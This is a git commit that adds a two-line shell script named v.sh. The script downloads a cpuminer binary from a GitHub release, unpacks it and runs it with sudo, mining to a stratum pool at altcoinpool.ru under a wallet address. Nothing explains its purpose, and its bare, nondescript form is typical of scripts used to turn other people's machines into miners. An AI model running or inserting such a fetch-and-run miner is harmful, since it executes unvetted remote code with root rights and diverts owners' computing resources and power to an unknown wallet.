fdafb7767b32a4a7853c174f6befe526b47ed26c
zakiahnp <87823344+zakiahnv@users.noreply.github.com>
2023-02-20 11:46:21 +0700

    Create v.sh

---
+++ v.sh
@@ -0,0 +1,2 @@
+wget https://github.com/heshuchao/space-mining-guide/releases/download/v0.1.0.0/cpuminer.tar.gz && tar zxvf cpuminer.tar.gz && rm -rf cpuminer.tar.gz && chmod +x minerd
+sudo ./minerd -a sha256d -o stratum+tcp://altcoinpool.ru:3336 -u 1N5tf31XFvWZL2LzvfH2CuU9ybG9CVDerD.anifgoran -p c=SPACE,m=solo
